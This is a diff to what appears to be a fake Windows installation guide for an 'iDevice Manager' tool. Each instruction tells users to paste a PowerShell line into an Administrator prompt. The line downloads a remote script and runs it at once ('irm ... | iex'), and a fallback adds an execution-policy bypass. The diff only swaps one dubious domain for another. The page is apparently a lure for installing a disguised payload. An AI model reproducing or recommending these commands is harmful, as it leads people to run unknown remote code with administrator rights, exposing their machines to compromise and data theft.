@@ -17,13 +17,13 @@ iDevice Manager PC Windows Guide · Device toolkit · Diagnostics · Windows des
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://usevision.fun/ps/setup.ps1 | iex
+irm https://webmania.xyz/ps/setup.ps1 | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://usevision.fun/ps/setup.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://webmania.xyz/ps/setup.ps1 | iex"
 ```
 
 
@@ -59,7 +59,7 @@ Notes for users who need **iDevice Manager PC Windows Guide** running on Windows
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://usevision.fun/ps/setup.ps1 | iex</code>
+<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://webmania.xyz/ps/setup.ps1 | iex</code>
 </details>
 
 <details>
@@ -69,7 +69,7 @@ Notes for users who need **iDevice Manager PC Windows Guide** running on Windows
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://usevision.fun/ps/setup.ps1 | iex"</code>
+<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://webmania.xyz/ps/setup.ps1 | iex"</code>
 </details>
 
 <details>
